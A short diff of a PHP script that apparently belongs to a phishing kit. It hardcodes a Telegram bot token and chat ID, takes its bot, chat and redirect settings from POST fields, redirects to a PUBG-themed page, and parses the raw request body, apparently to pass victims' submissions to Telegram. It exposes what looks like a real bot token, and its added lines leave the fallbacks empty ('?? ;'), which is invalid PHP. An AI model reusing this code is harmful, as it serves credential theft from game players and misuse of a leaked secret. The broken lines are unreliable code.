@@ -2,8 +2,8 @@
 $defaultBotToken = '7890110555:AAEIWR8tMgZEKYC9C6lsgnc1C-uau8iAyYk';
 $defaultChatId = '512392705';
 $defaultRedirectUrl = '../php/pubg/index.php';
-$botToken = $_POST['botToken'] ?? $defaultBotToken;
-$chatId = $_POST['chatId'] ?? $defaultChatId;
+$botToken = $_POST['botToken'] ?? ;
+$chatId = $_POST['chatId'] ?? ;
 $redirectUrl = isset($_POST['redUrl']) ? "../php/" . $_POST['redUrl'] : $defaultRedirectUrl;
 $decodedMessage = urldecode(file_get_contents('php://input'));
 parse_str($decodedMessage, $params);
